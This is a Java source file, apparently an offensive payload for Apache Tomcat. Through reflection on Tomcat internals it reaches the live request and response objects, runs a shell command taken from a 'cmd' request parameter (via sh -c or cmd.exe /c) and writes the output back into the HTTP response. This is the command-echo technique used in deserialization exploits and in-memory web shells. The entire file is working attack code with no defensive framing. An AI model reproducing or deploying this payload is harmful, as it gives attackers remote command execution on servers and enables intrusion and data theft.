package com.echo;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class TomcatEcho2 {
    public void testDemo() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //获取Tomcat CloassLoader context
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.getResources().getContext();

        //获取standardContext的context
        Field contextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
        contextField.setAccessible(true);
        org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(standardContext);

        //获取ApplicationContext的service
        Field serviceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
        serviceField.setAccessible(true);
        org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(ApplicationContext);

        //获取StandardService的connectors
        Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
        connectorsField.setAccessible(true);
        org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[]) connectorsField.get(standardService);

        //获取AbstractProtocol的handler
        org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
        Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
        handlerField.setAccessible(true);
        org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

        //获取内部类ConnectionHandler的global
        Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
        globalField.setAccessible(true);
        RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

        //获取RequestGroupInfo的processors
        Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
        processors.setAccessible(true);
        java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);

        //获取Response，并做输出处理
        Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
        req.setAccessible(true);
        for (RequestInfo requestInfo : RequestInfolist) {
            org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
            org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
            org.apache.catalina.connector.Response response2 = request2.getResponse();
            java.io.Writer w = response2.getWriter();

            String cmd = request2.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            w.write(output);
            w.flush();
            Field responseField = ResponseFacade.class.getDeclaredField("response");
            responseField.setAccessible(true);
            Field usingWriter = Response.class.getDeclaredField("usingWriter");
            usingWriter.setAccessible(true);
            usingWriter.set(response2, Boolean.FALSE);
        }
    }
}
